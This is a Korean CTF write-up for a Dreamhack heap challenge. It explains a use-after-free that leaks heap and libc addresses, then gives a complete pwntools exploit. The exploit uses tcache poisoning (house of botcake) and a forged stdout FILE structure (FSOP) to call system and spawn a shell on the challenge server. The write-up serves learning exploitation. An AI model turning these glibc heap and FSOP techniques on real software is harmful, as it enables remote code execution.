메세지가 길면 블록블록 잘라서 연쇄적으로 청크를 구성한다.
가장 중요한 점은 첫 번째 청크는
ptr + 0 : idx
ptr + 1 : size
ptr + 2 : next_chunk,
ptr + 3 ~ : message
나머지 청크는
ptr + 0 : next_chunk
ptr + 1 ~ : message
이다.
첫 번째 청크 주소를 head에 저장한다. 그런데 free를 한 뒤에 초기화해주지 않으므로 UAF 취약점이 발생한다.
idx 1에 0x30 size인 청크를 할당했다가 해제하면
idx 2에 0x1000 + 0x30 size인 청크를 할당할 때 idx 1의 size와 next_chunk를 조작하면서 할당받을 수 있고, `write`에서 size만큼 힙 영역을 출력해주기 때문에 이 취약점을 이용하여 heap_base, libc_base를 leak할 수 있다.

fastbin을 이용하려면 fake chunk를 직접 구성해야 하는데 스택 주소 값도 모르므로 그럴 수 없다. tcache chunk는 재할당받으려는 청크 부분의 size 검사를 하지 않으므로 tcache를 이용했어야 했다. 따라서 익스는 tcache 취약점인 house of botcake를 이용했다.

고생 : 문제는 fake_chunk 주소가 정렬되어 있지 않는 오류였다. 여태껏 heap_base, 즉 XOR key가 고정되어 있는 줄 알았다. 그런데 코드를 보니 XOR key 는 ptr >> 12 였다. 문제를 풀면서 청크를 약 0x3000 정도 남발하면서 사용했기 때문에 초기에 구한 XOR key와 차이가 생겨버린 것이다.
```python
from pwn import *
from tqdm import *

#context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]

#p = process('./prob')
p = remote('host3.dreamhack.games', 16696)
l = ELF('./libc.so.6')

def FSOP_struct(flags=0, _IO_read_ptr=0, _IO_read_end=0, _IO_read_base=0,
                _IO_write_base=0, _IO_write_ptr=0, _IO_write_end=0, _IO_buf_base=0, _IO_buf_end=0,
                _IO_save_base=0, _IO_backup_base=0, _IO_save_end=0, _markers=0, _chain=0, _fileno=0,
                _flags2=0, _old_offset=0, _cur_column=0, _vtable_offset=0, _shortbuf=0, lock=0,
                _offset=0, _codecvt=0, _wide_data=0, _freeres_list=0, _freeres_buf=0,
                __pad5=0, _mode=0, _unused2=b"", vtable=0, more_append=b""):
    
    FSOP = p64(flags) + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base)
    FSOP += p64(_IO_write_base) + p64(_IO_write_ptr) + p64(_IO_write_end)
    FSOP += p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end)
    FSOP += p64(_markers) + p64(_chain) + p32(_fileno) + p32(_flags2)
    FSOP += p64(_old_offset) + p16(_cur_column) + p8(_vtable_offset) + p8(_shortbuf) + p32(0x0)
    FSOP += p64(lock) + p64(_offset) + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf)
    FSOP += p64(__pad5) + p32(_mode)
    if _unused2 == b"":
        FSOP += b"\x00" * 0x14
    else:
        FSOP += _unused2[0x0:0x14].ljust(0x14, b"\x00")
    
    FSOP += p64(vtable)
    FSOP += more_append
    return FSOP

def w(idx : int, size : int, payload : bytes):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'idx: ', str(idx).encode())
    p.sendlineafter(b'size: ', str(size).encode())
    p.send(payload)

def r(idx : int):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())
    p.recvuntil(b'msg->buf = ')
    return p.recvline()[:-1]

w(1, 1, b'a')
w(2, 1, b'a')
r(2)
r(1)
w(3, (0xfe8 + 0x18), b'a' * 0xfe8 + p64(0x100) + b'a' * 0x10)
leak = r(1)
heap_base = u64(leak[0x18:0x18 + 6].ljust(8, b'\x00')) << 12
print(hex(heap_base))
#chunk full
w(1, 1, b'a')
w(2, 1, b'a')

w(1, 1, b'a')
r(1)
w(2, 0x500, b'a' * 0x500)
w(3, (0xfe8 + 0x18), b'a' * 0xfe8 + p64(0x100) + b'a' * 0x10)
r(2)
leak = r(1)
l.address = u64(leak[0x18:0x18 + 6].ljust(8, b'\x00')) - (0x7ffff7facce0 - 0x7ffff7d93000)
print(hex(l.address))
#chunk full
w(1, 1, b'a')
w(2, 0x500, b'a' * 0x500)

for i in tqdm(range(9)):
    w(i, 0x100 - 0x18, b'a' * (0x100 - 0x18))
w(9, 1, b'a')

for i in tqdm(range(7)):
    r(i)
r(8)
r(7)
w(6, 0x100 - 0x18, b'a' * (0x100 - 0x18))
r(8)

fake_fsop_struct = l.sym['_IO_2_1_stdout_']
stdout_lock = l.address + (0x7ffff7faea70 - 0x7ffff7d93000)
FSOP = FSOP_struct(
    flags=u64(b"\x01\x01\x01\x01;sh\x00"),
    lock=stdout_lock,
    _wide_data=fake_fsop_struct - 0x10,
    _markers=l.symbols["system"],
    _unused2=p32(0x0) + p64(0x0) + p64(fake_fsop_struct - 0x8),
    vtable=l.symbols["_IO_wfile_jumps"] - 0x20,
    _mode=0xFFFFFFFF,
)

w(10, 0x120 - 0x18, b'a' * (0x100 - 0x18 + 0x8) + p64(0x111) + p64((fake_fsop_struct - 0x20) ^ ((heap_base >> 12) + 3)) + b'a' * 0x8)

#gdb.attach(p)
#pause()

w(11, 0x100 - 0x18, b'a' * (0x100 - 0x18))
w(12, 0x100 - 0x18, p64(l.sym["_IO_file_jumps"]) + FSOP)
p.interactive()
```